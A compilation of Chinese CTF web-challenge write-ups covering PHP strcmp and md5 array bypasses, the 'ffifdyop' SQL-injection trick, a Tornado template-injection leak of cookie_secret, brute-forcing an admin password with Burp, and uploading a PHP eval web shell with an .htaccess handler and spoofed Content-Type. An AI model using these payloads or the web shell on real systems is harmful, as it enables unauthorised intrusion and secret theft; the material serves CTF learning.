使用科学计数法绕过money：<br />`password=404a&money=1e9`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699608061333-f16a2fa0-0455-48ab-8dd0-cf81e963cc4b.png#averageHue=%23f8f8f8&clientId=u1342fd3d-7d5a-4&from=paste&height=694&id=u1ba89bfc&originHeight=868&originWidth=1714&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=170347&status=done&style=none&taskId=uc00305a8-51a2-4db8-bc0f-ddd14763abd&title=&width=1371.2)<br />当money=1时<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699608241262-f4f49cd0-d0a1-41c9-acff-22e69e6fbab0.png#averageHue=%23f9f8f8&clientId=u1342fd3d-7d5a-4&from=paste&height=724&id=u82b8fdac&originHeight=905&originWidth=1714&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=179303&status=done&style=none&taskId=u0f68f33a-992d-4e11-8e34-ecd1af6058f&title=&width=1371.2)
> you have not enough money,loser
> 你没有足够的钱

经过给money参数分情况测试，有3种输出结果
> - 当 money => 100000000
>    - 输出"Nember lenth is too long"
> - 当 money < 100000000
>    - 输出"you have not enough money,loser"
> - 当 1e9 <= money <= 1e999999（说着当money变为数组时）
>    - 输出"flag值"
> 
猜测用到了函数strcmp()用来比较两个字符串，同时还可以比较两个字符串的字符数
> strcmp(_string1,string2_)
> - 0 - 如果两个字符串相等
> - <0 - 如果 string1 小于 string2
> - >0 - 如果 string1 大于 string2
> 
**所以当过滤不当不全时，可以通过将参数变为数组的方式进行绕过，这样的话就无法比较，直接返回true**

这里大胆猜测他的后台源码：
```php
<?php
$flag=100000000;
$Flag='flag{0c531ed2-9c1e-479a-adcb-d975b1376ca6}'
if (isset($_POST['money'])) {       
	if (strcmp($_POST['money'],$flag) == 0)#比较money和flag的值和字符数，"=="PHP弱比较逻辑运算符           
		echo $Flag;       
  elseif(strcmp($_POST['money'],$flag) < 0)           
		print 'you have not enough money,loser';
  else
    print 'Nember lenth is too long';
}
?>
```
通过数组绕过money：<br />`password=404a&mony[]=0`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699613098401-7a2b1c41-2eda-4743-9ab8-bd405d91c186.png#averageHue=%23f7f7f7&clientId=u1342fd3d-7d5a-4&from=paste&height=818&id=ub55e708e&originHeight=1022&originWidth=1916&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=161668&status=done&style=none&taskId=u7000ced0-091d-4516-adc9-b9f62c9fcd6&title=&width=1532.8)
> 中途我2023版Burp里面的Repeater消失不见了，这里问下师傅们，现在不知道怎么回事，所以我又用2021版本Kali做题了，苦涩

**得到flag：**<br />`flag{cb3acdc3-dcda-49d0-9597-b7247f9c6ff0}`

原文链接：https://blog.csdn.net/m0_73734159/article/details/134339328?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22134339328%22%2C%22source%22%3A%22m0_73734159%22%7D

## [BJDCTF2020]Easy MD5 1

题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699683330948-a1c8726b-c02d-4a8a-9bae-be0fd6b6c565.png#averageHue=%23fdfdfd&clientId=u21854629-628d-4&from=paste&height=814&id=u1fdc9a1f&originHeight=1017&originWidth=1914&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=48536&status=done&style=none&taskId=u75537810-7506-4bce-b557-d6a2543d6a7&title=&width=1531.2)
> 尝试了SQL注入、命令执行等都不行

点击提交并burp进行抓包<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699685130127-5bb65d1b-a2d5-49d2-9650-978ac70ee830.png#averageHue=%23f9f9f9&clientId=u21854629-628d-4&from=paste&height=734&id=ua300e7e1&originHeight=918&originWidth=1706&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=145165&status=done&style=none&taskId=u9e05a461-bdb1-4abc-a128-33e23501b58&title=&width=1364.8)<br />Repeater进行重放<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699685215046-e97a4fb1-d71d-4e64-9e66-79dbd61d4a17.png#averageHue=%23f9f8f8&clientId=u21854629-628d-4&from=paste&height=746&id=u42dbd81f&originHeight=932&originWidth=1722&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=190230&status=done&style=none&taskId=u10258830-ac8f-46d5-8752-f025584489e&title=&width=1377.6)<br />这里看到了内置的SQL语句<br />`select * from 'admin' where password=md5($pass,true)`
> 发现传进去的值会进行md5加密

这里看了大佬们的解释
> ffifdyop绕过，绕过原理是：<br />ffifdyop 这个字符串被 [md5](https://so.csdn.net/so/search?q=md5&spm=1001.2101.3001.7020) 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是' or '6<br />而 Mysql 刚好又会把 hex 转成 ascii 解释，因此拼接之后的形式是select * from 'admin' where password='' or '6xxxxx'，等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数。

> 所以说看到这段内置SQL语句，直接使用ffifdyop绕过即可，这就是它的原理

使用ffifdyop进行绕过<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699686126236-b3748616-17e0-4419-b1d7-3f1599447d87.png#averageHue=%23fdfdfc&clientId=u21854629-628d-4&from=paste&height=569&id=u7ed9ac3f&originHeight=711&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=50461&status=done&style=none&taskId=u574610b2-7051-4236-9584-59e1ef13a27&title=&width=1534.4)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699686149776-906eaa77-2c60-43e6-b974-e0baa65a95b4.png#averageHue=%23fbfbfb&clientId=u21854629-628d-4&from=paste&height=642&id=u158e5e91&originHeight=803&originWidth=1907&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=47517&status=done&style=none&taskId=ucebb6508-9e81-43d2-b321-0e53f061e22&title=&width=1525.6)<br />F12查看源代码<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699686202171-32cf90b2-a8fd-428b-9060-db03ba6af014.png#averageHue=%23fdfdfd&clientId=u21854629-628d-4&from=paste&height=760&id=u6adff580&originHeight=950&originWidth=1911&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=31575&status=done&style=none&taskId=u6417d4b1-c8e4-4e5c-981a-b2167314a08&title=&width=1528.8)
```php
 <!--  
$a = $GET['a'];  
$b = $_GET['b'];   
 if($a != $b && md5($a) == md5($b))
{  
// wow, glzjin wants a girl friend.  
--> 
```
MD5弱比较通过数组绕过原理：
> MD5数组绕过原理是利用了PHP中数组作为参数传递时的hash计算漏洞。在PHP中，数组作为参数传递时会被hash计算，但是MD5函数只能接受字符串类型的参数，因此当数组作为参数传递时，会提示MD5()函数需要一个string类型的参数。为了绕过这个限制，可以通过将数组转化为字符串类型后再进行MD5运算，从而实现绕过绕过限制的目的。

GET方式进行传参：<br />`a[]=1&b[]=2`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699686626028-53d519b0-bf54-4258-b0ea-78d00018e371.png#averageHue=%23fbfbfb&clientId=u21854629-628d-4&from=paste&height=578&id=u8d3f7b5d&originHeight=723&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=54077&status=done&style=none&taskId=u610a5551-fc94-4c16-8124-ed77abeead6&title=&width=1536)<br />回车：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699686692201-4c9d3b22-e3b5-4e74-a8da-daefc95a75d4.png#averageHue=%23fcfbfa&clientId=u21854629-628d-4&from=paste&height=238&id=u8e9590c2&originHeight=298&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=31657&status=done&style=none&taskId=u72503321-337e-45b7-aa32-480c2528d9e&title=&width=1536)
```php
<?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
echo $flag;
}
```
> 通过POST方式进行传参
> 弱比较通过数组绕过第一个
> MD5强比较仍然可以使用数组进行绕过

POST进行传参：<br />`param1[]=1&param2[]=2`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699687231154-356143eb-1fe9-4333-a5c7-bbb07161ff14.png#averageHue=%23fcfcfc&clientId=u21854629-628d-4&from=paste&height=864&id=u6a813136&originHeight=1080&originWidth=1917&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=105582&status=done&style=none&taskId=u04e50e4e-42a2-46be-b3b5-d38ddd3efdc&title=&width=1533.6)<br />**得到flag：**<br />`flag{107355e0-5214-4977-b55f-650e264f2074}`

原文链接：https://blog.csdn.net/m0_73734159/article/details/134349129?spm=1001.2014.3001.5501

## [护网杯 2018]easy_tornado 1（两种解法！）

题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699767639305-6f45e82e-e7ba-462d-a9ac-d3a4532880c7.png#averageHue=%23fdfdfc&clientId=uf3f75f0b-ee50-4&from=paste&height=390&id=u357b0d19&originHeight=488&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=32157&status=done&style=none&taskId=u1bb5f53f-b40b-4d1f-9136-93b6f1bd48c&title=&width=1534.4)<br />发现有三个txt文本文件
> /flag.txt<br />/welcome.txt<br />/hints.txt

依此点开<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699768772925-27c0e6df-5824-4936-a6a8-75cf928005b9.png#averageHue=%23faf9f8&clientId=uf3f75f0b-ee50-4&from=paste&height=167&id=X7sGZ&originHeight=209&originWidth=1901&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=34168&status=done&style=none&taskId=u93897832-b84c-4245-8140-970bc40bcb9&title=&width=1520.8)
> **flag在/fllllllllllllag文件中**

![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699768851274-3d397fc4-8250-44f0-ba84-f3c917d06ed0.png#averageHue=%23fbfbfa&clientId=uf3f75f0b-ee50-4&from=paste&height=238&id=ub4aa7ad4&originHeight=297&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36763&status=done&style=none&taskId=ufc53a7c3-10ff-4bcb-a6df-2630482a7df&title=&width=1536)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699768885680-99b2d1ec-5735-4853-9ea1-eefd6ce07518.png#averageHue=%23faf9f8&clientId=uf3f75f0b-ee50-4&from=paste&height=166&id=u52f9265c&originHeight=207&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=35670&status=done&style=none&taskId=u7d807c96-fae8-487b-b1da-9dfc3f252f8&title=&width=1536)
> 在hints.txt文件中发现md5计算
> md5(cookie_secret+md5(filename))

> 并且三个文件中都存在filehash（文件名被哈希算法加密32位小写）

> 猜测解题关键点在md5(cookie_secret+md5(filename))这里
> 首先flag在/fllllllllllllag文件中**，**所以就是filename=/fllllllllllllag**;**filehash=md5(cookie_secret+md5(filename))
> 现在只缺cookie_secret这个东西，只要有了cookie_secret再通过这个md5(cookie_secret+md5(filename))公式进行计算即可获取到flag

> 注意题目easy_tornado 1；tornado是python的一个模板，可以看出这道题是模板注入类的题目

改哈希值看看是否有变化<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699769548303-492d1959-3885-44d2-998d-163af0714f4c.png#averageHue=%23faf9f8&clientId=uf3f75f0b-ee50-4&from=paste&height=182&id=u036411e5&originHeight=227&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=35589&status=done&style=none&taskId=u820ce820-cf4c-46a8-b036-04875783a7c&title=&width=1536)<br />回车<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699769589127-c0a81f90-4c21-4189-b563-a5b471deb9a7.png#averageHue=%23fbfaf9&clientId=uf3f75f0b-ee50-4&from=paste&height=183&id=u2986ca43&originHeight=229&originWidth=1913&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=33984&status=done&style=none&taskId=ucc31388b-ca68-4a2e-ab84-ce593092c92&title=&width=1530.4)
> **模板注入必须通过传输型如{{xxx}}的执行命令**

![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699769643824-c3b8de5a-1ba4-4038-826a-0586ada38ac8.png#averageHue=%23fbfaf9&clientId=uf3f75f0b-ee50-4&from=paste&height=160&id=u4180f586&originHeight=200&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=29096&status=done&style=none&taskId=u11595679-633f-4e94-9957-ccfb3cfea58&title=&width=1536)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699769668865-0e48f957-7e0c-46c0-a601-70be553a7d0a.png#averageHue=%23fbfaf9&clientId=uf3f75f0b-ee50-4&from=paste&height=168&id=ua3fe892a&originHeight=210&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=32927&status=done&style=none&taskId=uf403a604-dd4f-4fc5-8dd5-421322e4be0&title=&width=1536)<br />果然是tornado模板注入
> 在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量。

> 简单理解handler.settings即可，可以把它理解为tornado模板中内置的环境配置信息名称，通过handler.settings可以访问到环境配置的一些信息，看到tornado模板基本上可以通过handler.settings一把梭。

爆cookie_secret<br />`error?msg={{handler.settings}}`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699769995941-3c6ba7b0-bd17-4223-9521-6652d0043d66.png#averageHue=%23f6f5f3&clientId=uf3f75f0b-ee50-4&from=paste&height=212&id=ud5d73b0e&originHeight=265&originWidth=1919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=56659&status=done&style=none&taskId=u762c29dd-9e74-41ac-a607-4eb56625f95&title=&width=1535.2)<br />得到cookie_secret<br />`76fc62a3-fea5-46ab-8f95-4b7262246f8c`<br />按照公式进行加密<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699770232606-9bdc13e8-2454-4e66-80dc-3436ddd795b4.png#averageHue=%23fefefe&clientId=uf3f75f0b-ee50-4&from=paste&height=222&id=ua4951ef0&originHeight=278&originWidth=1486&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=19834&status=done&style=none&taskId=u53d6dac4-09d8-4bb6-b653-cd2bff8ab9c&title=&width=1188.8)<br />`/fllllllllllllag=3bf9f6cf685a6dd8defadabfb41a03a1`<br />cookie_secret+md5(filename)<br />`76fc62a3-fea5-46ab-8f95-4b7262246f8c3bf9f6cf685a6dd8defadabfb41a03a1`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699770358271-f826c71b-038f-443f-a318-98d0ea751e98.png#averageHue=%23fefdfd&clientId=uf3f75f0b-ee50-4&from=paste&height=210&id=u64e0ec1d&originHeight=262&originWidth=1458&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=25684&status=done&style=none&taskId=ud66f2aab-ffbd-411c-92a9-45286b7199d&title=&width=1166.4)<br />md5(cookie_secret+md5(filename))<br />`39482391ef4cc45a75262be45e94c725`<br />**最终payload：**<br />`?filename=/fllllllllllllag&filehash=39482391ef4cc45a75262be45e94c725`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699770499713-110f1a97-134d-4355-995b-e9b127340e78.png#averageHue=%23f9f9f7&clientId=uf3f75f0b-ee50-4&from=paste&height=165&id=u176f419c&originHeight=206&originWidth=1919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=37925&status=done&style=none&taskId=u818b60cb-9d2c-4de4-9703-e76a300003e&title=&width=1535.2)<br />**当然也可以用python脚本进行加密**
```python
import hashlib  #选用哈希模块
filename = '/fllllllllllllag'  #文件名
cookie_secret = '76fc62a3-fea5-46ab-8f95-4b7262246f8c'#cookie_secret值
filename = hashlib.md5(filename.encode()).hexdigest()#/fllllllllllllag进行32位小写哈希md5加密
a = cookie_secret + filename#md5值进行拼接
filehash = hashlib.md5(a.encode()).hexdigest()#计算拼接后的md5值的md532小写的值
print(filehash)#输出加密后的md532位小写的值
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699770892785-062fe176-a4c4-4ca1-b198-8e914f2b4e27.png#averageHue=%23292a23&clientId=uf3f75f0b-ee50-4&from=paste&height=758&id=u8ce8807a&originHeight=947&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=174949&status=done&style=none&taskId=u91a7ebe4-ed48-4eb9-b398-cb5f463c490&title=&width=1534.4)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699770996646-75007fe5-297a-480d-8f93-a9b16176ba66.png#averageHue=%23f9f8f7&clientId=uf3f75f0b-ee50-4&from=paste&height=158&id=u6cab9e37&originHeight=197&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=34410&status=done&style=none&taskId=u9a92bea9-9ec4-404e-bc71-97123f320a9&title=&width=1536)<br />**得到flag：**<br />`flag{5ae1c44d-f83a-4005-a69b-a1ea133391db}`

原文链接：https://blog.csdn.net/m0_73734159/article/details/134360691?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22134360691%22%2C%22source%22%3A%22m0_73734159%22%7D

## [HCTF 2018]admin 1（四种解法！）

题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699839520313-e2639d27-db24-4168-936a-8ada7716a3c0.png#averageHue=%23fcfcfc&clientId=u171565c0-1b4a-4&from=paste&height=374&id=u71989777&originHeight=468&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=49398&status=done&style=none&taskId=u4a33f077-16f6-4ff9-8ae7-6d1588b4488&title=&width=1536)
> 有登录和注册两个按钮
> 先注册一个admin用户

注册admin用户<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699839626612-bf7ccd3f-5d3e-4afc-bd65-a0e956e1855b.png#averageHue=%23fefefe&clientId=u171565c0-1b4a-4&from=paste&height=528&id=ufb3e363a&originHeight=660&originWidth=1035&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=33187&status=done&style=none&taskId=ue6156d76-8eac-442e-b860-4c3f3b4391f&title=&width=828)
> 显示admin用户已经被注册了
> 好，这就简单了，admin用户存在，但是不清楚admin用户的密码
> 尝试以下弱口令

**第一种解法：密码爆破-尝试弱口令**
> 进去login登陆界面
> admin
> 123

![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699839995637-871e3bdd-9786-44e3-84c0-a10783e8969d.png#averageHue=%23fdfdfc&clientId=u171565c0-1b4a-4&from=paste&height=478&id=ue4d5355c&originHeight=597&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=51857&status=done&style=none&taskId=u3a0d16e9-2b30-461b-8ade-37a5264e6e8&title=&width=1536)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699840026226-7fdbb8a2-2bb5-4b86-9640-ed29ae91a81f.png#averageHue=%23fcfcfb&clientId=u171565c0-1b4a-4&from=paste&height=393&id=u0c3e4dae&originHeight=491&originWidth=1913&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=57873&status=done&style=none&taskId=u3ca475ef-742b-4544-9de4-95dbc8ded44&title=&width=1530.4)
> 啊，夺少？这就成功了？

**得到flag：**<br />`flag{73e15dda-e724-402f-a8df-b80bb22a4060}`<br />**第一种解法：密码爆破-burpsuite-字典**
> 不过话说回来，还是不应该投机取巧，咱们按照正常步骤走一遍

输入admin用户-密码任意比如说1-登录-并使用burp进行抓包<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699840848841-6b0a5e57-b736-4e70-b4df-f6f9f23b263c.png#averageHue=%23fbfaf9&clientId=u171565c0-1b4a-4&from=paste&height=736&id=u95fc5087&originHeight=920&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=114448&status=done&style=none&taskId=u0d68c9ac-0202-4ec3-a3a7-f52d477f9b7&title=&width=1374.4)

Intruder送去爆破<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699840915125-fb4efc66-56f1-4acf-85bb-0e33d5be776c.png#averageHue=%23f8f7f7&clientId=u171565c0-1b4a-4&from=paste&height=750&id=u43c89d5d&originHeight=938&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=193012&status=done&style=none&taskId=u067c872a-aeda-45dd-be06-6b6fb16ba00&title=&width=1374.4)<br />选择爆破对象<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699841010841-daa74c93-b77b-4ddf-b509-19845fbc18d9.png#averageHue=%23f8f7f7&clientId=u171565c0-1b4a-4&from=paste&height=743&id=u3988a0a4&originHeight=929&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=152846&status=done&style=none&taskId=u1a90856f-f4ad-42a8-b709-fc5c832434e&title=&width=1374.4)
> 光标选中1，Add添加即可

选择字典进行爆破<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699841110807-212dba9b-21af-406a-b55f-c180e6945394.png#averageHue=%23f7f7f7&clientId=u171565c0-1b4a-4&from=paste&height=726&id=u846034c1&originHeight=908&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=101602&status=done&style=none&taskId=udcbcf13a-151d-4621-813d-d62f9b62f7a&title=&width=1374.4)<br />Start attack开始爆破<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699841199116-008d57ad-0484-46e0-abb1-25541383f299.png#averageHue=%23f7f7f7&clientId=u171565c0-1b4a-4&from=paste&height=726&id=ucc672cf8&originHeight=908&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=96379&status=done&style=none&taskId=ud4e64d52-7dfe-4190-96ac-27da90a16b1&title=&width=1374.4)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699841358426-674b9ccb-4076-4e76-ac03-0c4bc8c131a8.png#averageHue=%23f6f6f6&clientId=u171565c0-1b4a-4&from=paste&height=721&id=u52aa96c3&originHeight=901&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=110045&status=done&style=none&taskId=ufca5efaf-4f12-42c4-a685-19afb4d0d27&title=&width=1374.4)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699841520212-3624331f-2a30-4042-854c-66d936ec17b0.png#averageHue=%23fbfbfa&clientId=u171565c0-1b4a-4&from=paste&height=740&id=uda3ca86e&originHeight=925&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=116007&status=done&style=none&taskId=u3d4d56ff-885b-40a7-8159-4a8a43cb827&title=&width=1374.4)
> 得到admin用户的密码
> 密码为123

登录admin用户<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699841581913-b24788df-71ec-4456-9300-51f53b5765b8.png#averageHue=%23fdfdfc&clientId=u171565c0-1b4a-4&from=paste&height=479&id=u163b83c1&originHeight=599&originWidth=1916&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=56284&status=done&style=none&taskId=ubf992c73-d116-4527-8fed-8bf953c1ebb&title=&width=1532.8)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699841633432-7ad2f0a9-e2f4-445f-b65f-00581d73b719.png#averageHue=%23fcfcfb&clientId=u171565c0-1b4a-4&from=paste&height=382&id=u2b7d28f0&originHeight=478&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=60904&status=done&style=none&taskId=u55d931a6-8840-4492-8216-23972af047b&title=&width=1536)<br />**得到flag：**<br />`flag{73e15dda-e724-402f-a8df-b80bb22a4060}`
> **第二种解法：flask session 伪造**
> **第三种解法：Unicode欺骗**
> **第四种解法：条件竞争**
> **这三种解法大家可以看这位师傅写的文章，非常详细**[**https://blog.csdn.net/qq_46918279/article/details/121294915**](https://blog.csdn.net/qq_46918279/article/details/121294915)

原文链接：https://blog.csdn.net/m0_73734159/article/details/134372214?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22134372214%22%2C%22source%22%3A%22m0_73734159%22%7D

## （.htaccess文件特性）[MRCTF2020]你传你🐎呢 1

题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699870319843-43da1adb-b9c1-454f-8e6e-d10b8bcb1c43.png#averageHue=%23d8d7d3&clientId=uc4f9745e-3876-4&from=paste&height=551&id=udf4f585a&originHeight=689&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=638791&status=done&style=none&taskId=u8a006a75-9a1e-4290-be1a-78d68009f68&title=&width=1536)
> 不难看出是一道文件上传漏洞

上传一句话木马文件<br />burpsuite进行抓包<br />`<?php @eval($_POST['shell']);?>`
> 命名为PHP文件格式

![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699943172301-640ca741-31b4-4a7b-848a-5e83d350bbfc.png#averageHue=%23e8e6e3&clientId=u3b3bf35b-d4c8-4&from=paste&height=750&id=u9d0419e7&originHeight=938&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=534640&status=done&style=none&taskId=ufd300600-74c4-4bbb-a0a3-d47a322e88a&title=&width=1374.4)<br />Repeater进行重放<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699943256871-969346a7-32f6-47b7-906e-694be3ec2092.png#averageHue=%23f8f7f7&clientId=u3b3bf35b-d4c8-4&from=paste&height=750&id=u917b1853&originHeight=938&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=182306&status=done&style=none&taskId=ua873d315-fa5d-4d62-bbd6-545db6898bf&title=&width=1374.4)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699943290724-e46fcbe4-40fa-4a7b-9f1a-3eec2c429b1e.png#averageHue=%23f8f8f8&clientId=u3b3bf35b-d4c8-4&from=paste&height=730&id=uedef10ca&originHeight=912&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=169621&status=done&style=none&taskId=u5891db10-4dbf-4318-8487-197821eb73d&title=&width=1374.4)
> 尝试了其它后缀进行绕过都没有成功
> 通过 application/x-php内容类型，可以看出被识别出是PHP文件，猜测作者使用了htaccess文件更改了相关配置

了解.htaccess文件
> 概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现:网页[301重定向](https://baike.so.com/doc/5328820-5563992.html)、自定义404错误页面、**改变文件扩展名**、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。
> 注意这几个字“改变文件扩展名”，后面会用到

尝试传入jpg文件（一句话木马不变）<br />回显结果是否会有所不同<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699943802167-bdbd0dfa-673e-4d42-826b-db40fdf8d007.png#averageHue=%23f8f7f7&clientId=u3b3bf35b-d4c8-4&from=paste&height=726&id=u89ed5ed3&originHeight=908&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=184491&status=done&style=none&taskId=ud2b55a87-0579-4f56-a61d-9282669ebfb&title=&width=1374.4)
> 发现上传成功
> 访问上传的文件
> ![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699943880370-5f441f6b-8618-47c5-b4cb-12f792765786.png#averageHue=%23292929&clientId=u3b3bf35b-d4c8-4&from=paste&height=784&id=uf59c848c&originHeight=980&originWidth=1919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=52633&status=done&style=none&taskId=ubd9535fe-abd7-445d-883e-207b5e96868&title=&width=1535.2)
> 图片加载失败
> 到这里猜想使用中国蚁剑是连接不成功的
> 不过咱们还是按照正常程序走一遍比较好

使用中国蚁剑进行连接<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699944078968-56041b8b-ed47-4c89-be93-30f1fc8c003d.png#averageHue=%23f2f1ef&clientId=u3b3bf35b-d4c8-4&from=paste&height=864&id=h2zA3&originHeight=1080&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=105477&status=done&style=none&taskId=u711bea65-67b9-42b6-81aa-086b83436cb&title=&width=1536)
> 返回数据为空
> 到这里我们的一句话木马并没有被识别出来，或者说并没有执行，猜测被拦截
> 尝试上传更改后的.htaccess文件

上传.htaccess文件
```php
<FileMatch "1.jpg>
SetHandler application/x-httpd-php
</FileMatch>
```
> 上传的一句话木马文件要和1.jpg文件名一模一样
> 可以把这段代码理解为，将1.jpg文件内容当作PHP文件执行

![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699944601972-04889d4a-6686-4da9-b4cb-aa8b1f14fcef.png#averageHue=%23f8f7f7&clientId=u3b3bf35b-d4c8-4&from=paste&height=754&id=u5ec0c426&originHeight=942&originWidth=1725&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=367197&status=done&style=none&taskId=ua4ba77ec-0c11-4482-af56-cf9747d282d&title=&width=1380)
> 发现被拦截了，更改内容类型为image/jpeg进行绕过

更改Content-Type内容类型为:image/jpeg<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699944734280-3db3114a-1ae9-4c25-95ea-d11b4206eab3.png#averageHue=%23f7f7f7&clientId=u3b3bf35b-d4c8-4&from=paste&height=728&id=uc5e31f01&originHeight=910&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=189464&status=done&style=none&taskId=u8e720367-14ee-44fa-89b9-90c7917c49b&title=&width=1374.4)
> .htaccess文件上传成功

